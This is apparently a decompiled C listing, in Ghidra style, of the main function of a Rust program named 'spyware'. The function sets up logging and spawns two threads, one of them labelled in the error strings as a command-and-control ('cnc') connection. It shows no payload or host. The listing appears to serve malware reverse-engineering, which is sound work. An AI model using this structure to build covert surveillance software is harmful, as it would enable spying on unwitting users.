void _ZN7spyware4main17h0c167b4c5fedcce2E(void)

{
  ulong uVar1;
  undefined auVar2 [16];
  undefined **local_d8;
  undefined8 uStack_d0;
  undefined8 local_c8;
  undefined8 uStack_c0;
  undefined8 uStack_b8;
  undefined local_b0;
  undefined4 local_af;
  undefined2 local_ab;
  undefined local_a9;
  undefined8 local_a0 [2];
  undefined8 local_90;
  undefined8 local_88;
  undefined8 local_80;
  undefined local_78;
  undefined4 local_77;
  undefined2 local_73;
  undefined local_71;
  undefined *local_70;
  undefined8 local_68;
  undefined *local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined local_48 [32];
  undefined local_28 [32];
  
  _ZN7spyware12init_logging17h71d90daabdd6a317E();
  uVar1 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
  if (2 < uVar1) {
    local_d8 = &PTR_s_Logging_successfully_initialized_001b9430;
    uStack_d0 = 1;
    local_c8 = 8;
    uStack_c0 = 0;
    uStack_b8 = 0;
    local_50 = (*(code *)PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620)
                         (&PTR_DAT_001b9440);
    local_70 = &DAT_001127b8;
    local_68 = 7;
    local_60 = &DAT_001127b8;
    local_58 = 7;
    _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_d8,3,&local_70);
  }
  local_90 = 0x8000000000000000;
  local_a0[0] = 0;
  local_78 = 0;
  uStack_b8 = local_80;
  local_b0 = 0;
  local_af = local_77;
  local_ab = local_73;
  local_a9 = local_71;
  local_c8 = 0x8000000000000000;
  uStack_c0 = local_88;
  local_d8 = (undefined **)0x0;
  _ZN3std6thread7Builder15spawn_unchecked17hebf060dfae3bacc5E(&local_70,&local_d8);
  _ZN4core6result19Result_LT_T_C_E_GT_6expect17h0214701cb0e2f56bE(local_48,&local_70);
                    /* try { // try from 00151f92 to 00151ff0 has its CatchHandler @ 0015203c */
  _ZN3std6thread7Builder15spawn_unchecked17h346b3a5527f731faE(&local_d8,local_a0);
  _ZN4core6result19Result_LT_T_C_E_GT_6expect17h0214701cb0e2f56bE(local_28,&local_d8);
  auVar2 = _ZN3std6thread18JoinInner_LT_T_GT_4join17hba541073fdcb0e40E(&local_d8);
  _ZN4core6result19Result_LT_T_C_E_GT_6expect17h4bc56609d4fa5fe6E
            (auVar2._0_8_,auVar2._8_8_,"The cnc connection has panicked.",0x20,&PTR_DAT_001b9458);
  auVar2 = _ZN3std6thread18JoinInner_LT_T_GT_4join17hba541073fdcb0e40E(&local_d8);
  _ZN4core6result19Result_LT_T_C_E_GT_6expect17h4bc56609d4fa5fe6E
            (auVar2._0_8_,auVar2._8_8_,
             "The server connection has panicked.LoggingNotInitializedErrorLoggingSetupCalledTwiceLoggingInitializationError"
             ,0x23,&PTR_DAT_001b9470);
  return;
}